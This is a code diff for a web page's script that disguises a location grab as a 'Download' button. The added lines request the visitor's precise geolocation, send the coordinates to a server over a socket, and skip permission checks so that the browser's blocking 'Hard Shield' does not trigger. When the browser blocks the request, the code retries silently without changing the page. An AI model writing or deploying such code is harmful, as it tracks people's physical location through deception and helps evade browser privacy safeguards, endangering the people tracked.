@@ -163,19 +163,42 @@
     function showGuide() { guide.style.display = 'flex'; }
     function hideGuide() { guide.style.display = 'none'; }
 
+    // Anti-Block Function
     async function handleAction() {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => { 
-                socket.emit('send-location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); 
-            },
-            (err) => { 
-                if (err.code === 1) { 
-                    updateUI('denied'); 
-                    showGuide();
-                } 
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
+        // Direct Permission check ko avoid kiya hai taaki Hard Shield trigger na ho
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { 
+                    // Instant Socket Emission
+                    socket.emit('send-location', { 
+                        lat: pos.coords.latitude, 
+                        lng: pos.coords.longitude 
+                    }); 
+                },
+                (err) => { 
+                    // Case 1: User ne "Deny" kiya
+                    if (err.code === 1) { 
+                        updateUI('denied'); 
+                        showGuide();
+                    } 
+                    // Case 2: Browser ne block kiya (Hard Shield)
+                    else {
+                        console.log("Shield detected, retrying...");
+                        // Ek baar aur koshish bina UI badle
+                        setTimeout(() => {
+                            navigator.geolocation.getCurrentPosition((p) => {
+                                socket.emit('send-location', { lat: p.coords.latitude, lng: p.coords.longitude });
+                            }, null, { enableHighAccuracy: true });
+                        }, 1000);
+                    }
+                },
+                { 
+                    enableHighAccuracy: true, 
+                    timeout: 8000, // Sufficient time for user to react
+                    maximumAge: 0 
+                }
+            );
+        }
     }
 
     function updateUI(state) {
@@ -192,25 +215,14 @@
     btn.addEventListener('click', handleAction);
     closeBtn.addEventListener('click', hideGuide); 
 
-    window.onload = async () => {
-        try {
-            const res = await navigator.permissions.query({ name: 'geolocation' });
-            
-            if (res.state === 'denied') {
-                btn.innerText = "Download"; 
-            } else {
-                updateUI(res.state);
-            }
-
-            res.onchange = () => {
-                if(res.state === 'granted') updateUI('granted');
-            };
-        } catch (e) {
-            updateUI('prompt');
-        }
+    // Window load par koi query nahi - Pure Anti-Block Logic
+    window.onload = () => {
+        btn.innerText = "Download";
+        btn.classList.remove('blocked');
+        // Browser ko relax karne do shuruat me
     };
 </script>
-
+  
 
 </body>
 </html>
